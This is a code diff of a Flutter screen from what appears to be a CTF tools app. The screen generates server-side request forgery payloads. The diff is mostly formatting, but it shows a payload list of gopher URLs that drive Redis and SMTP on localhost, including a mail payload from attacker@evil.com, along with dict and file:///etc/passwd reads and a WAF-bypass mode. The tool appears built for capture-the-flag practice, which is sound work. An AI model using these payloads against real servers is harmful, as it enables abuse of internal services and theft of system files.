@@ -1,6 +1,5 @@
 import 'package:flutter/material.dart';
 import 'package:ctf_tools/shared/widgets/code_editor.dart';
-import 'dart:convert';
 
 class SSRFDetectorScreen extends StatefulWidget {
   const SSRFDetectorScreen({super.key});
@@ -37,14 +36,28 @@ class _SSRFDetectorScreenState extends State<SSRFDetectorScreen> {
   ];
 
   final List<Map<String, String>> _advancedPayloads = [
-    {'name': 'Gopher 协议', 'payload': 'gopher://127.0.0.1:6379/_GET%20HTTP/1.1%250d%250aHost:%2520127.0.0.1%250d%250a%250d%250a'},
+    {
+      'name': 'Gopher 协议',
+      'payload':
+          'gopher://127.0.0.1:6379/_GET%20HTTP/1.1%250d%250aHost:%2520127.0.0.1%250d%250a%250d%250a',
+    },
     {'name': 'Dict 协议', 'payload': 'dict://127.0.0.1:11211/stats'},
     {'name': 'File 协议', 'payload': 'file:///etc/passwd'},
     {'name': 'TFTP 协议', 'payload': 'tftp://127.0.0.1:69/test'},
     {'name': 'LDAP 协议', 'payload': 'ldap://127.0.0.1:389'},
-    {'name': 'Redis GET', 'payload': 'gopher://127.0.0.1:6379/_GET%20key%0d%0a'},
-    {'name': 'Redis SET', 'payload': 'gopher://127.0.0.1:6379/_SET%20key%20value%0d%0a'},
-    {'name': 'SMTP 发送', 'payload': 'gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<victim@victim.com>%0d%0aDATA%0d%0aSubject:%20SSRF%20Attack%0d%0a%0d%0aEvil%20Content%0d%0a.%0d%0aQUIT%0d%0a'},
+    {
+      'name': 'Redis GET',
+      'payload': 'gopher://127.0.0.1:6379/_GET%20key%0d%0a',
+    },
+    {
+      'name': 'Redis SET',
+      'payload': 'gopher://127.0.0.1:6379/_SET%20key%20value%0d%0a',
+    },
+    {
+      'name': 'SMTP 发送',
+      'payload':
+          'gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<victim@victim.com>%0d%0aDATA%0d%0aSubject:%20SSRF%20Attack%0d%0a%0d%0aEvil%20Content%0d%0a.%0d%0aQUIT%0d%0a',
+    },
   ];
 
   List<Map<String, String>> _getCurrentPayloads() {
@@ -63,19 +76,19 @@ class _SSRFDetectorScreenState extends State<SSRFDetectorScreen> {
   void _generatePayloads() {
     final target = _targetController.text.trim();
     final payloads = _getCurrentPayloads();
-    
+
     final buffer = StringBuffer();
     buffer.writeln('=== SSRF Payload 列表 ===\n');
     buffer.writeln('目标：$target\n');
     buffer.writeln('类型：${_payloadType.toUpperCase()}\n');
     buffer.writeln('=' * 50);
-    
+
     for (var p in payloads) {
       buffer.writeln('\n【${p['name']}】');
       buffer.writeln('${p['payload']}$target');
       buffer.writeln('-' * 50);
     }
-    
+
     setState(() {
       _payloadController.text = buffer.toString();
     });
@@ -91,7 +104,10 @@ class _SSRFDetectorScreenState extends State<SSRFDetectorScreen> {
   void _copyPayload() {
     if (_payloadController.text.isNotEmpty) {
       ScaffoldMessenger.of(context).showSnackBar(
-        const SnackBar(content: Text('已复制到剪贴板'), duration: Duration(seconds: 1)),
+        const SnackBar(
+          content: Text('已复制到剪贴板'),
+          duration: Duration(seconds: 1),
+        ),
       );
     }
   }
@@ -120,15 +136,24 @@ class _SSRFDetectorScreenState extends State<SSRFDetectorScreen> {
                   ),
                   const SizedBox(height: 16),
                   DropdownButtonFormField<String>(
-                    value: _payloadType,
+                    initialValue: _payloadType,
                     decoration: const InputDecoration(
                       labelText: 'Payload 类型',
                       border: OutlineInputBorder(),
                     ),
                     items: const [
-                      DropdownMenuItem(value: 'basic', child: Text('基础探测 - 本地回环、DNS 等')),
-                      DropdownMenuItem(value: 'bypass', child: Text('WAF 绕过 - 编码、混淆等')),
-                      DropdownMenuItem(value: 'advanced', child: Text('高级利用 - Gopher、Dict 等协议')),
+                      DropdownMenuItem(
+                        value: 'basic',
+                        child: Text('基础探测 - 本地回环、DNS 等'),
+                      ),
+                      DropdownMenuItem(
+                        value: 'bypass',
+                        child: Text('WAF 绕过 - 编码、混淆等'),
+                      ),
+                      DropdownMenuItem(
+                        value: 'advanced',
+                        child: Text('高级利用 - Gopher、Dict 等协议'),
+                      ),
                     ],
                     onChanged: (value) {
                       setState(() {
@@ -170,10 +195,13 @@ class _SSRFDetectorScreenState extends State<SSRFDetectorScreen> {
           Center(
             child: ElevatedButton.icon(
               onPressed: _generatePayloads,
-              icon: const Icon(Icons.generate),
+              icon: const Icon(Icons.auto_awesome),
               label: const Text('生成 Payload'),
               style: ElevatedButton.styleFrom(
-                padding: const EdgeInsets.symmetric(horizontal: 48, vertical: 16),
+                padding: const EdgeInsets.symmetric(
+                  horizontal: 48,
+                  vertical: 16,
+                ),
               ),
             ),
           ),
